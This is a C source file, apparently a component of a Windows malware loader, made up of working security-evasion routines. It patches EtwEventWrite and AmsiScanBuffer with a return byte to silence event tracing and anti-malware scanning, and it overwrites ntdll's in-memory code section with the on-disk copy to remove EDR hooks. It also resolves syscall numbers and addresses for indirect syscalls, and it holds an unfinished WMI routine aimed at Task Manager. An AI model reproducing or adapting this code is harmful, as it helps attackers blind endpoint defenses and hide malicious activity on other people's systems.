#include <stdio.h>
#include <Windows.h>
#include "injection.h"
#include "config.h"
#include "wbemidl.h"
#pragma comment(lib, "wbemuuid.lib")
DWORD g_ssn = 0;
PVOID g_syscall = NULL;


BOOL EtwPatch() {
	
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

	if (hNtdll == NULL) {
		return 0;
	}
	
	PVOID pEtwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
	
	if (pEtwAddr == NULL) {
		return 0;
	}	
	
	DWORD oldProtect = 0;
	if (VirtualProtect(pEtwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		*(BYTE*)pEtwAddr = 0xC3;
		VirtualProtect(pEtwAddr, 1, oldProtect, &oldProtect);
		FlushInstructionCache(GetCurrentProcess(), pEtwAddr, 1);
		printf("[x] ETW Patched!\n");
		return 1;

	}
	else {
		return 0;
	}

}

BOOL EdrHookerCheck() {
	HANDLE hNtdll = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
		GENERIC_READ,
		FILE_SHARE_READ, NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hNtdll == NULL) {
		printf("[-] Failed to open on-disk ntdll");
		return 0;
	}

	HANDLE hMappedNtdll = CreateFileMappingW(hNtdll, NULL, PAGE_READONLY, 0, 0, NULL);

	if (hMappedNtdll == NULL) {
		printf("[-] Failed to map on-disk ntdll");
		return 0;
	}

	PVOID pNtdll = MapViewOfFile(hMappedNtdll, FILE_MAP_READ, 0, 0, 0);

	if (pNtdll == NULL) {
		printf("[-] Failed to map view of on-disk ntdll");
		return 0;
	}


	HMODULE hmy_Ntdll = GetModuleHandleW(L"ntdll.dll");
	PVOID my_ntdll = manual_procaddress(hmy_Ntdll, "EtwEventWrite");
	PVOID disk_ntdll = manual_procaddress((HMODULE)pNtdll, "EtwEventWrite");

	if (memcmp(my_ntdll, disk_ntdll, 5) == 0) {
		printf("[x] No EDR Hooks Detected\n");
		CloseHandle(hNtdll);
		CloseHandle(hMappedNtdll);
		UnmapViewOfFile(pNtdll);
		return 1;
	}
	else {
		printf("[-] EDR HOOKS DETECTED!\n");
		CloseHandle(hNtdll);
		CloseHandle(hMappedNtdll);
		UnmapViewOfFile(pNtdll);
		return 0;
	}
}

BOOL unhook_Ntdll() {
	HANDLE hNtdll = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
		GENERIC_READ,
		FILE_SHARE_READ, NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hNtdll == NULL) {
		printf("[-] Failed to open on-disk ntdll");
		return 0;
	}

	HANDLE hMappedNtdll = CreateFileMappingW(hNtdll, NULL, PAGE_READONLY, 0, 0, NULL);

	if (hMappedNtdll == NULL) {
		printf("[-] Failed to map on-disk ntdll");
		return 0;
	}

	PVOID pNtdll = MapViewOfFile(hMappedNtdll, FILE_MAP_READ, 0, 0, 0);

	if (pNtdll == NULL) {
		printf("[-] Failed to map view of on-disk ntdll");
		return 0;
	}

	HMODULE hmy_Ntdll = GetModuleHandleW(L"ntdll.dll");
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hmy_Ntdll;
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hmy_Ntdll + dos->e_lfanew);

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
		if (memcmp(section->Name, ".text", 5) == 0) {
			DWORD text_addr = section->VirtualAddress;
			PVOID text_mem_addr = (PVOID)((BYTE*)hmy_Ntdll + text_addr);
			DWORD text_size = section->SizeOfRawData;
			DWORD old_protect = 0;
			VirtualProtect(text_mem_addr, text_size, PAGE_EXECUTE_READWRITE, &old_protect);
			memcpy(text_mem_addr, (BYTE*)pNtdll + section->PointerToRawData, text_size);
			FlushInstructionCache(GetCurrentProcess(), text_mem_addr, text_size);
			VirtualProtect(text_mem_addr, text_size, old_protect, &old_protect);
			UnmapViewOfFile(pNtdll);
			CloseHandle(hMappedNtdll);
			CloseHandle(hNtdll);
			printf("[x] Ntdll Unhooked!\n");
			return 1;
		}
	}
	return 0;
}

BOOL AmsiPatch() {

	HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");

	if (hAmsi == NULL) {
		return 0;
	}

	PVOID pAmsiAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");

	if (pAmsiAddr == NULL) {
		return 0;
	}
	DWORD oldProtect = 0;
	if (VirtualProtect(pAmsiAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		*(BYTE*)pAmsiAddr = 0xC3;
		VirtualProtect(pAmsiAddr, 1, oldProtect, &oldProtect);
		FlushInstructionCache(GetCurrentProcess(), pAmsiAddr, 1);
		printf("[x] AMSI Patched!\n");
		return 1;
	}
	else {
		return 0;
	}

}

DWORD getSSN(char* funcName) {

	HANDLE hNtdll = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
		GENERIC_READ,
		FILE_SHARE_READ, NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hNtdll == NULL) {
		printf("[-] Failed to open on-disk ntdll");
		return 0;
	}

	HANDLE hMappedNtdll = CreateFileMappingW(hNtdll, NULL, PAGE_READONLY, 0, 0, NULL);

	if (hMappedNtdll == NULL) {
		printf("[-] Failed to map on-disk ntdll");
		return 0;
	}

	// use this
	PVOID pNtdll = MapViewOfFile(hMappedNtdll, FILE_MAP_READ, 0, 0, 0);

	if (pNtdll == NULL) {
		printf("[-] Failed to map view of on-disk ntdll");
		return 0;
	}

	PVOID func_Addr = manual_procaddress((HMODULE)pNtdll, funcName);

	if (func_Addr == NULL) {
		UnmapViewOfFile(pNtdll);
		CloseHandle(hMappedNtdll);
		CloseHandle(hNtdll);
		return NULL; 
	}

	DWORD ssn = *(DWORD*)((BYTE*)func_Addr + 4);

	// cleanup
	UnmapViewOfFile(pNtdll);
	CloseHandle(hMappedNtdll);
	CloseHandle(hNtdll);

	return ssn;
}

PVOID getSyscallAddr(char* funcName) {

	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

	PVOID pfunc_addr = GetProcAddress(hNtdll, funcName);
	BYTE* bfunc_addr = (BYTE*)pfunc_addr;
	for (int i = 0; i < 32; i++) {
		if (bfunc_addr[i] == 0x0F && bfunc_addr[i + 1] == 0x05) {
			return (PVOID)&bfunc_addr[i];
		}
	}
	return NULL;
}

VOID TaskmgrPatch() {

	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) { return; }
	if (FAILED(CoInitializeSecurity(
		NULL, -1, NULL, NULL,
		RPC_C_AUTHN_LEVEL_DEFAULT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL, EOAC_NONE, NULL
	))) {
		return;
	}

	IWbemLocator* pLocator = NULL;
	 if(FAILED(CoCreateInstance(
		&CLSID_WbemLocator,
		NULL,
		CLSCTX_INPROC_SERVER,
		&IID_IWbemLocator,
		(LPVOID*)&pLocator
	))) { return; }
	
	 // todo: finish 
	 //pLocator->lpVtbl->ConnectServer("root\default",NULL,NULL,)

}
